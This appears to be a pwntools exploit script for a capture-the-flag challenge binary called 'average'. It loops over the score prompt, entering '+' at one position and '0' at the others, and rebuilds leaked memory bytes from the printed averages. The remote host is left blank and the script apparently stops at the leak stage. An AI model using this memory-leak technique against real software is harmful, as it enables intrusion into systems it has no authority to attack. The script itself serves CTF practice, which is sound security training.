#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
import warnings
import logging
from Crypto.Util.number import long_to_bytes
gdb_script='''
'''

path="./average"
if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
libc=elf.libc
HOST=""
PORT= 0
context.binary = elf
rop=ROP(elf)
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
g 		= lambda sym,data			: log.info(f"\033[32m {sym} | {hex(data)}\033[32m")
r 		= lambda sym,data			: log.info(f"\033[31m {sym} | {hex(data)}\033[31m")
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
leaks=b""
for i in range(20):
	p=process(path)
	for leak_c in range(20):
		if leak_c==i:
			sla("for","+")
		else:
			sla("for","0")
	ru("score is")
	leak=abs(int((float(rl().strip()[:-1])*20)))
	leaks+=(long_to_bytes(leak)[::-1])
print(leaks)
ia()
